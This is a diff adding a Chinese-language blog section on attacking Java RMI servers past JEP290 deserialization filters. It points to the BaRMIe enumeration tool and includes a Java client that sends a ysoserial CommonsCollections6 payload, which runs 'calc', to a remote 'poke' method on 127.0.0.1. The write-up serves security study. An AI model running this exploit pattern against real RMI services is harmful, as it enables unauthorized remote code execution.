@@ -226,3 +226,36 @@ sun.rmi.server.UnicastRef#marshalValue
 ![4.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/4.png)
 
 
+
+### Java RMI扩展思考
+
+JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器,在RMI客户端和服务端在通信时参数传递这块是没有做处理的,而参数传递也是基于序列化数据传输。
+
+但是在实际情况中，遇到了RMI server。当然注册中心往往是和server绑定在一起的。可以直接对注册中心进行反序列化攻击，但是如果jdk版本过高，这时候要考虑绕过JEP290的问题。然而这个时候却需要知道当前RMI server绑定的哪些接口，这里需要使用工具**BaRMIe**（https://github.com/NickstaDB/BaRMIe）
+
+![9.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/9.png)
+
+如果知道接口为Object，即可直接利用
+
+	public class AttackClient {
+	public static void main(String[] args) {
+	try {
+	            String serverIP = "127.0.0.1"; //args[0];
+				int serverPort = 1234;
+	// Lookup the remote object that is registered as "bsides"
+	            Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);
+	            IBSidesService bsides = (IBSidesService) registry.lookup("bsides");
+	// create the malicious object via ysososerial,
+	// the OS command is taken from the command line
+	            Object payload = new CommonsCollections6().getObject("calc");
+	// pass it to the target by calling the "poke" method
+	            bsides.poke(payload);
+	        } catch (Exception e) {
+	            e.printStackTrace();
+	        }
+	    }
+	}
+
+通过获取到绑定了Hello这个接口对象，接着构造执行链修改字节码。
+
+
